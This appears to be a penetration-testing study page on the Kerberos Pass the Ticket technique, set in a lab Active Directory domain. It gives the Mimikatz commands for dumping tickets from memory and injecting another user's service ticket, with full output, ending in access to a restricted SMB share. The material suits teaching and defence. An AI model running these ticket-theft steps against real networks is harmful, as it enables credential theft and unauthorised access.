---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pass the Ticket

As seen in a [previous example](overpass-the-hash.md), overpassing the hash allows an attacker to create a TGT for a user. However that TGT is tied to the machine on which it was created. **Pass the Ticket** (**PtT**) instead leverages a TGS which can be exported and used elsewhere.

The basic premise is that the attacker extracts a valid TGS from a victim machine. That TGS can then be re-injected somewhere else on the network and used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

## Example Background

[Recall](../authentication/attacking-ad-authentication/password-attacks.md#spray-passwords) that the attacker has access to the compromised `jen` account inside the AD environment. This account can be used to sign in to `CLIENT76` (on which `jen` is an Administrator) via RDP. From there the goal will be compromising `WEB04` by extracting the `dave` user's TGS for `WEB04` and then injecting it into a user's command session.

Recall also that WEB04 has an SMB share at \\\web04\backup. The jen user does not have access to that share though:

```powershell
PS C:\Users\jen> ls \\web04\backup
ls : Access is denied
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Once `dave`'s TGS is compromised this will become accessible.

## Mimikatz

### Obtaining the Tickets

As usual Mimikatz has a module for this. The first step is to use the sekurlsa module to dump all tickets as seen [here](../../../software/mimikatz.md#tickets):

```
sekurlsa::tickets /export
```

* `/export` flag tells Mimikatz to save the tickets into files. Each ticket is saved into a `.kirbi` file

When run a multitude of ticket files are generated:

```shell-session
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 3572993 (00000000:00368501)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 4/7/2024 8:27:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 4/7/2024 8:27:35 PM ; 4/8/2024 6:27:35 AM ; 4/14/2024 8:27:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             51f758455115c69cb4940fe673f09058448c89509171771aac9ecc42b33f992f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
           * Saved to file [0;368501]-0-0-40810000-dave@cifs-web04.kirbi !
...
mimikatz # exit
Bye!

C:\Users\jen\Tickets>dir
 
 Directory of C:\Users\jen\Tickets

04/07/2024  08:27 PM    <DIR>          .
04/07/2024  08:27 PM    <DIR>          ..
04/07/2024  08:27 PM             1,601 [0;1032e8]-0-0-40a50000-jen@LDAP-DC1.corp.com.kirbi
04/07/2024  08:27 PM             1,511 [0;1032e8]-2-0-40e10000-jen@krbtgt-CORP.COM.kirbi
04/07/2024  08:27 PM             1,577 [0;336f08]-0-0-40810000-dave@cifs-web04.kirbi
04/07/2024  08:27 PM             1,521 [0;336f08]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
04/07/2024  08:27 PM             1,577 [0;338745]-0-0-40810000-dave@cifs-web04.kirbi
04/07/2024  08:27 PM             1,521 [0;338745]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
04/07/2024  08:27 PM             1,577 [0;33b3e7]-0-0-40810000-dave@cifs-web04.kirbi
...
04/07/2024  08:27 PM             1,577 [0;368501]-0-0-40810000-dave@cifs-web04.kirbi
04/07/2024  08:27 PM             1,521 [0;368501]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
04/07/2024  08:27 PM             1,615 [0;3e7]-0-1-40a10000.kirbi
04/07/2024  08:27 PM             1,633 [0;3e7]-0-2-40a50000-CLIENT76$@LDAP-DC1.corp.com.kirbi
04/07/2024  08:27 PM             1,653 [0;3e7]-0-3-40a50000-CLIENT76$@ldap-DC1.corp.com.kirbi
04/07/2024  08:27 PM             1,563 [0;3e7]-2-0-60a10000-CLIENT76$@krbtgt-CORP.COM.kirbi
04/07/2024  08:27 PM             1,563 [0;3e7]-2-1-40e10000-CLIENT76$@krbtgt-CORP.COM.kirbi
04/07/2024  08:27 PM             1,577 [0;a99c1]-0-0-40810000-dave@cifs-web04.kirbi
04/07/2024  08:27 PM             1,521 [0;a99c1]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
              57 File(s)         88,971 bytes
               2 Dir(s)   2,035,691,520 bytes free
```

I have not found exact documentation on how the names are constructed but some pieces can be observed easily. To understand consider this specific ticket copied from above:

```
Authentication Id : 0 ; 3572993 (00000000:00368501)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 4/7/2024 8:27:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 4/7/2024 8:27:35 PM ; 4/8/2024 6:27:35 AM ; 4/14/2024 8:27:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             51f758455115c69cb4940fe673f09058448c89509171771aac9ecc42b33f992f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
           * Saved to file [0;368501]-0-0-40810000-dave@cifs-web04.kirbi !
```

The ticket has a line saying which file contains this particular ticket. The name starts with 2 numbers which are also in the Authentication ID field of the ticket. The numbers are a ticket type and a [LUID](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-dtyp/48cbee2a-0790-45f2-8269-931d7083b2c3). The first number is the type of ticket:

* `0`: TGS
* `1`: client ticket
* `2`: TGT

The LUID is just an identifier on the system. The ticket type and hex representation of the LUID go inside brackets to start the filename `[0;368501]...`. I am not sure what the `-0-0` section of the name is exactly. The flags are the next field in the name `-40810000`. [Flags](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/de260077-1955-447c-a120-af834afe45c2) control some behavioral aspects for tickets. The ticket name ends in the user for which the ticket was created (`dave`) and the service it is a ticket for (`cifs-web04`). [CIFS](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) is part of SMB and indicates this TGS could perhaps be used to access files via SMB on `WEB04`.

### Passing a Ticket

Once a ticket has been selected to be used the `kerberos::ptt` command is used to inject the ticket into process memory:

```
kerberos::ptt [0;368501]-0-0-40810000-dave@cifs-web04.kirbi
```

* The `kerberos::ptt` command is followed by the path to the `.kirbi` file. In this example Mimikatz is being run from the same folder the tickets are saved in. Were it in a different folder the full file path would be required

Once run, assuming no errors, the ticket should appear in the output of `klist` in the `cmd` session:

```shell-session
mimikatz # kerberos::ptt [0;368501]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;368501]-0-0-40810000-dave@cifs-web04.kirbi': OK
mimikatz # exit
Bye!
PS C:\Users\jen\Tickets> klist

Current LogonId is 0:0x1032e8

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 4/7/2024 20:27:35 (local)
        End Time:   4/8/2024 6:27:35 (local)
        Renew Time: 4/14/2024 20:27:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

The SMB share (`\\web04\backup`) that was found to be inaccessible to `jen` above should now be reachable:

```powershell
PS C:\Users\jen\Tickets> ls \\web04\backup


    Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   5:52 AM              0 backup_schemata.txt
```

This indicates the `dave`'s ticket was successfully passed and that the `dave` user has access to this particular share.
